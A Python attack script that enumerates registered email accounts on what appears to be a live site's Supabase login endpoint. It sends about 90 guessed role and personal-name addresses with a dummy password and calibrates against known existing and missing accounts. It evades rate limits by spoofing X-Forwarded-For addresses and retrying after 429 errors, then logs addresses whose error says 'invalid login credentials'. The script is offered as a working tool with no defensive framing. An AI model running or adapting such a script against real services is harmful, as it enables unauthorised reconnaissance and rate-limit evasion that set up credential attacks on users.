import ssl, json, urllib.request, urllib.error, time, random

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
URL = "https://onlyfakeai.ru/api/supabase/auth/v1/token?grant_type=password"

local_parts = [
    "admin", "administrator", "support", "info", "sales", "billing",
    "contact", "help", "service", "webmaster", "postmaster", "mail",
    "office", "hello", "team", "owner", "boss", "ceo", "founder",
    "onlyfake", "onlyfakeai", "fakeai", "fake", "ai", "ops", "op",
    "test", "demo", "dev", "developer", "sysadmin", "root", "security",
    "abuse", "finance", "accounting", "hr", "marketing", "seo",
    "alex", "alexander", "sasha", "ivan", "vanya", "dima", "dmitry",
    "sergey", "serg", "mikhail", "misha", "pavel", "pasha",
    "andrei", "andrey", "vlad", "vladimir", "nikita", "max", "maksim",
    "oleg", "igor", "roman", "roma", "kirill", "timur", "arthur",
    "denis", "evgeny", "zhenya", "anton", "fedor", "fedya",
    "nick", "user", "user1", "account", "login",
    "bot", "telegram", "tgbot", "api", "noreply",
    "no-reply", "notification", "alerts", "orders", "reports",
    "accounts", "moderator", "mod", "staff", "web", "hostmaster",
]
rows = [f"{lp}@onlyfakeai.ru" for lp in local_parts]

log = open("email_enum.log", "a", encoding="utf-8")
found = []

def check(email):
    xff = f"198.51.100.{random.randint(1,250)}"
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY,
         "Content-Type": "application/json;charset=UTF-8",
         "X-Forwarded-For": xff}
    body = json.dumps({"email": email, "password": "EnumProbeX9!pass"}).encode()
    r = urllib.request.Request(URL, data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

# calibrate: known-existing vs known-missing responses
st, body = check("onlyfake@tuta.io")
print("known existing ->", st, body[:160])
st, body = check("zzz_no_such_rat@onlyfakeai.ru")
print("known missing  ->", st, body[:160])

print(f"[enum] {len(rows)} candidates", flush=True)
for i, em in enumerate(rows):
    if em in ("admin@onlyfakeai.ru", "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"):
        found.append(em)
        continue
    for attempt in range(3):
        st, body = check(em)
        if st == 429:
            time.sleep(6)
            continue
        break
    if st in (400, 422):
        low = body.lower()
        if "invalid login credentials" in low or "invalid_credentials" in low:
            found.append(em)
            log.write(f"REGISTERED {em}\n"); log.flush()
            print(f"REGISTERED: {em}", flush=True)
    if i % 10 == 0:
        log.write(f"{time.strftime('%H:%M:%S')} {i}/{len(rows)} found={len(found)}\n"); log.flush()
    time.sleep(0.6)

open("emails_found.txt", "w").write("\n".join(found))
print("[done] found:", found, flush=True)
